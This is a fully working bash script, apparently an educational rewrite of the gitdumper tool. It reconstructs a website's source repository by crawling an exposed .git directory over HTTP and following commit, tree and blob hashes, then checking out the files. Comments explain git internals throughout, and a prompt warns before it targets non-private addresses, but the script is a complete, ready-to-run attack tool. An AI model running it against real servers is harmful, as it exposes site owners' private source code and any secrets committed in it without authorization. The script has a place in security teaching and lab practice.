#!/bin/bash
# =============================================================================
# git-dumper-educational.sh
#
# Educational reimplementation of GitTools' gitdumper.sh
# Original project: https://github.com/internetwache/GitTools
# Original author:  @gehaxelt / @internetwache
#
# PURPOSE:
#   Demonstrates how exposed .git directories can be reconstructed from
#   individual HTTP-accessible files. For use in authorized lab environments
#   only (e.g., DVWA, HackTheBox, your own Docker lab).
#
# USAGE:
#   ./git-dumper-educational.sh http://localhost:8080/.git/ ./output
#
# REQUIREMENTS:
#   curl, git, strings, grep, sed
# =============================================================================

# -----------------------------------------------------------------------------
# SECTION 1: GIT INTERNALS PRIMER
# -----------------------------------------------------------------------------
# Before we write a single line of shell, it helps to understand what we're
# actually downloading. A .git directory has this structure:
#
#   .git/
#   ├── HEAD              # Plain text: points to current branch ref
#   │                     # e.g. "ref: refs/heads/main"
#   │
#   ├── config            # INI-style config: remotes, branches, user info
#   │
#   ├── description       # Plain text: used by GitWeb, rarely interesting
#   │
#   ├── index             # Binary: the staging area / working tree state
#   │
#   ├── packed-refs       # Plain text: packed branch/tag -> commit hash map
#   │
#   ├── refs/
#   │   ├── heads/        # One file per local branch, contains commit hash
#   │   │   └── main      # e.g. "a1b2c3d4..."
#   │   ├── remotes/      # Tracking branches from remotes
#   │   └── tags/         # Tag refs
#   │
#   ├── logs/
#   │   ├── HEAD          # Reflog: history of HEAD movements
#   │   └── refs/heads/   # Per-branch reflogs
#   │
#   └── objects/
#       ├── info/
#       │   └── packs     # Lists available packfiles
#       ├── pack/
#       │   ├── *.pack    # Binary: compressed object storage
#       │   └── *.idx     # Index into the packfile
#       └── ab/
#           └── cdef...   # Loose object: first 2 chars = dir, rest = filename
#                         # This is where the real data lives!
#
# GIT OBJECT TYPES (stored in objects/):
# ---------------------------------------
# Every piece of data in git is stored as one of four object types,
# addressed by the SHA-1 hash of their content (content-addressable storage).
#
#   BLOB   - Raw file contents. No filename, no metadata. Just bytes.
#            "What is in this file?"
#
#   TREE   - A directory listing. Maps filenames to blob/tree hashes + modes.
#            "What files/subdirs are in this directory, and at what hashes?"
#            Format: "<mode> <name>\0<20-byte-binary-hash>" repeated
#
#   COMMIT - A snapshot. Points to a root tree hash, parent commit hash(es),
#            author, committer, timestamp, and message.
#            "Who saved what tree, when, and why?"
#
#   TAG    - An annotated tag. Points to a commit with a message and signature.
#            "This commit has a named release label."
#
# WHY THIS MATTERS FOR THE EXPLOIT:
# -----------------------------------
# If we can read HEAD, we get a branch ref.
# That ref file gives us a commit hash.
# That commit object gives us a tree hash + parent commit hash.
# That tree object gives us blob hashes for every file.
# Those blob objects ARE the actual source files.
# By following the hash chain, we can reconstruct the entire repo.
# -----------------------------------------------------------------------------

set -euo pipefail

# =============================================================================
# SECTION 2: CONFIGURATION & ARGUMENT PARSING
# =============================================================================

BASEURL="${1:-}"
BASEDIR="${2:-}"

# Static list of well-known .git files to seed the download queue.
# We don't know which branches exist yet, so we start with common defaults
# and discover more dynamically as we parse downloaded files.
SEED_FILES=(
    "HEAD"                              # Always exists; tells us current branch
    "config"                            # May expose remote URLs, user info
    "description"                       # GitWeb description (usually boring)
    "COMMIT_EDITMSG"                    # Last commit message
    "index"                             # Binary staging area
    "packed-refs"                       # All refs in one file (modern repos)
    "info/refs"                         # Alternative ref listing
    "info/exclude"                      # Repo-local .gitignore
    "objects/info/packs"                # Lists packfiles if repo uses them
    "refs/heads/main"                   # Default branch (modern)
    "refs/heads/master"                 # Default branch (legacy)
    "refs/heads/develop"                # Common development branch
    "refs/remotes/origin/HEAD"          # Remote tracking ref
    "refs/stash"                        # Stashed changes (often overlooked)
    "logs/HEAD"                         # Reflog: ALL prior HEAD positions
    "logs/refs/heads/main"
    "logs/refs/heads/master"
    "logs/refs/remotes/origin/HEAD"
)

# Runtime state
QUEUE=()        # Files yet to be downloaded
DOWNLOADED=()   # Files already downloaded (deduplication)

# =============================================================================
# SECTION 3: VALIDATION
# =============================================================================

print_usage() {
    cat <<EOF
USAGE:
  $0 <url> <output-dir>

  url         Full URL to the .git directory
              e.g. http://localhost:8080/.git/
  output-dir  Local directory to store the reconstructed repo

EXAMPLE:
  $0 http://localhost:8080/.git/ ./lab-output
EOF
}

validate_inputs() {
    if [[ -z "$BASEURL" || -z "$BASEDIR" ]]; then
        echo "[!] ERROR: Missing required arguments."
        print_usage
        exit 1
    fi

    # The URL must end with /.git/ (or custom git dir) so our path
    # concatenation works correctly: BASEURL + "HEAD" = valid URL
    if [[ ! "$BASEURL" =~ /\.git/$ ]]; then
        echo "[!] ERROR: URL must end with /.git/"
        echo "    Got: $BASEURL"
        exit 1
    fi

    # Warn if pointing at a real external host — this tool is for labs only
    if [[ ! "$BASEURL" =~ ^http://(localhost|127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.) ]]; then
        echo ""
        echo "  ╔══════════════════════════════════════════════════════╗"
        echo "  ║  WARNING: URL does not appear to be a local/private  ║"
        echo "  ║  address. Only run this against systems you own or   ║"
        echo "  ║  have explicit written permission to test.           ║"
        echo "  ╚══════════════════════════════════════════════════════╝"
        echo ""
        read -r -p "  Continue anyway? (yes/no): " confirm
        [[ "$confirm" == "yes" ]] || exit 0
    fi
}

# =============================================================================
# SECTION 4: DOWNLOADING INDIVIDUAL GIT OBJECTS
# =============================================================================

# Download a single .git file by appending its relative path to BASEURL.
# After downloading, parse the file for:
#   - 40-character hex strings (SHA-1 object hashes)
#   - pack-* references (packfile names)
# Any newly discovered hashes/packs are added to the queue.
download_item() {
    local objname="$1"
    local url="${BASEURL}${objname}"
    local target="${BASEDIR}/.git/${objname}"
    local hashes=()
    local packs=()

    # Skip if already downloaded (the hash graph can have shared objects)
    if [[ " ${DOWNLOADED[*]} " =~ " ${objname} " ]]; then
        return 0
    fi
    DOWNLOADED+=("$objname")

    # Ensure the local subdirectory exists before writing the file
    local dir
    dir=$(dirname "$target")
    mkdir -p "$dir"

    # Fetch the file. We:
    #   --silent        suppress progress meter
    #   --fail          return non-zero on HTTP 4xx/5xx (don't save error pages)
    #   --location      follow redirects
    #   --max-time 10   don't hang forever
    if ! curl --silent --fail --location --max-time 10 \
              --output "$target" "$url"; then
        echo "  [-] Not found: $objname"
        rm -f "$target"
        return 0
    fi

    echo "  [+] Downloaded: $objname"

    # -------------------------------------------------------------------------
    # PARSING STRATEGY: Why we use `strings` and grep for hex hashes
    # -------------------------------------------------------------------------
    # Git object files are zlib-compressed binary data. We can't read them
    # directly as text. However:
    #
    #   1. `git cat-file -p <hash>` decompresses and pretty-prints an object.
    #      For COMMIT and TREE objects, this output contains the child hashes
    #      we need to follow.
    #
    #   2. `strings` extracts printable character sequences from binary data.
    #      This is a blunt instrument — it catches hashes in plain-text files
    #      (HEAD, config, packed-refs, logs/*) and occasionally in binary ones.
    #
    # For loose objects (paths matching objects/ab/cdef...):
    #   - We use `git cat-file` for accurate hash extraction
    #   - COMMIT objects: parent + tree hashes are in the header
    #   - TREE objects:   contain blob/subtree hashes (binary-encoded)
    #   - BLOB objects:   raw file data, but may contain hash-like strings
    #                     (e.g. lockfiles, manifests) — strings is fine here
    # -------------------------------------------------------------------------
    if [[ "$objname" =~ ^objects/[a-f0-9]{2}/[a-f0-9]{38}$ ]]; then

        # Reconstruct the 40-char hash from the path (remove "objects/" and "/")
        local hash
        hash=$(echo "$objname" | sed 's|objects/||' | tr -d '/')

        # Ask git what type this object is
        local type
        if ! type=$(git -C "$BASEDIR" cat-file -t "$hash" 2>/dev/null); then
            echo "  [!] Invalid object (corrupt or incomplete): $hash"
            rm -f "$target"
            return 0
        fi

        echo "      Object type: $type  ($hash)"

        case "$type" in
            commit)
                # COMMIT format (after decompression):
                #   tree <tree-hash>
                #   parent <parent-hash>    ← may have multiple parent lines
                #   author Name <email> timestamp timezone
                #   committer Name <email> timestamp timezone
                #   <blank line>
                #   <commit message>
                #
                # We extract all 40-char hex strings; this captures the tree
                # and parent hashes automatically.
                hashes+=($(
                    git -C "$BASEDIR" cat-file -p "$hash" \
                    | grep -oE '[a-f0-9]{40}'
                ))
                ;;
            tree)
                # TREE format (after decompression) is BINARY:
                #   "<mode> <filename>\0<20-byte-raw-hash>" repeated
                #
                # `git cat-file -p` pretty-prints it as:
                #   100644 blob a1b2c3...  filename.txt
                #   040000 tree d4e5f6...  subdir/
                #
                # We parse the pretty-print to get child hashes.
                hashes+=($(
                    git -C "$BASEDIR" cat-file -p "$hash" \
                    | grep -oE '[a-f0-9]{40}'
                ))
                ;;
            blob)
                # BLOB is raw file contents. We can't use git cat-file
                # meaningfully for hash extraction here, but the file might
                # be a lock/manifest containing hash references — use strings.
                hashes+=($(
                    strings -a "$target" | grep -oE '[a-f0-9]{40}'
                ))
                ;;
            tag)
                # ANNOTATED TAG format:
                #   object <commit-hash>
                #   type commit
                #   tag v1.0.0
                #   tagger Name <email> timestamp
                #   <message>
                hashes+=($(
                    git -C "$BASEDIR" cat-file -p "$hash" \
                    | grep -oE '[a-f0-9]{40}'
                ))
                ;;
        esac

    else
        # For non-object files (HEAD, config, refs/*, logs/*, packed-refs),
        # these are plain text and strings/grep works perfectly.
        hashes+=($(strings -a "$target" | grep -oE '[a-f0-9]{40}'))
    fi

    # Queue any newly discovered object hashes
    for hash in "${hashes[@]}"; do
        # Git loose objects are stored as: objects/<first2>/<remaining38>
        local obj_path="objects/${hash:0:2}/${hash:2}"
        if [[ ! " ${DOWNLOADED[*]} " =~ " ${obj_path} " ]]; then
            QUEUE+=("$obj_path")
        fi
    done

    # Queue any packfile references discovered
    # Packfiles bundle many objects into one file for efficiency.
    # Format: pack-<40-char-hash>.pack and .idx (index)
    packs+=($(strings -a "$target" | grep -oE 'pack-[a-f0-9]{40}'))
    for pack in "${packs[@]}"; do
        QUEUE+=("objects/pack/${pack}.pack")
        QUEUE+=("objects/pack/${pack}.idx")
    done
}

# =============================================================================
# SECTION 5: MAIN DOWNLOAD LOOP
# =============================================================================

run_dumper() {
    echo ""
    echo "================================================================="
    echo "  Git Dumper — Educational Edition"
    echo "  Target : $BASEURL"
    echo "  Output : $BASEDIR"
    echo "================================================================="
    echo ""

    # Initialize the repo skeleton so `git cat-file` works as we download
    mkdir -p "$BASEDIR"
    git -C "$BASEDIR" init --quiet

    # Seed the queue with well-known static file paths
    QUEUE=("${SEED_FILES[@]}")

    echo "[*] Starting download. Queue seeds: ${#SEED_FILES[@]} files"
    echo ""

    # Process queue items one at a time.
    # The queue GROWS as we discover new hashes in downloaded files,
    # so this loop naturally follows the full object graph.
    while [[ ${#QUEUE[@]} -gt 0 ]]; do
        local item="${QUEUE[0]}"
        QUEUE=("${QUEUE[@]:1}")   # Dequeue (shift left)
        download_item "$item"
    done

    echo ""
    echo "[*] Download phase complete."
    echo "    Files downloaded : ${#DOWNLOADED[@]}"
}

# =============================================================================
# SECTION 6: REPOSITORY RESTORATION
# =============================================================================

restore_repo() {
    echo ""
    echo "[*] Restoring working directory from git objects..."
    echo ""

    cd "$BASEDIR"

    # `git checkout -- .` reconstructs all tracked files from the index.
    # This only works if we successfully downloaded the index and the
    # blob objects it references.
    if git checkout -- . 2>/dev/null; then
        echo "[+] Working directory restored successfully."
    else
        echo "[!] Full checkout failed. Trying branch tips..."
        # Fallback: try checking out whatever branch HEAD points to
        git checkout HEAD 2>/dev/null || true
    fi

    echo ""
    echo "[*] Repository statistics:"
    echo "    Commits : $(git rev-list --all --count 2>/dev/null || echo 'unknown')"
    echo "    Branches: $(git branch -a 2>/dev/null | wc -l | tr -d ' ')"
    echo "    Files   : $(git ls-files 2>/dev/null | wc -l | tr -d ' ')"
}

# =============================================================================
# SECTION 7: ENTRY POINT
# =============================================================================

main() {
    validate_inputs
    run_dumper
    restore_repo

    echo ""
    echo "================================================================="
    echo "  Done. Explore your output with:"
    echo ""
    echo "  cd $BASEDIR"
    echo "  git log --oneline --graph --all"
    echo "  git branch -a"
    echo "  git show HEAD"
    echo "================================================================="
    echo ""
}

main
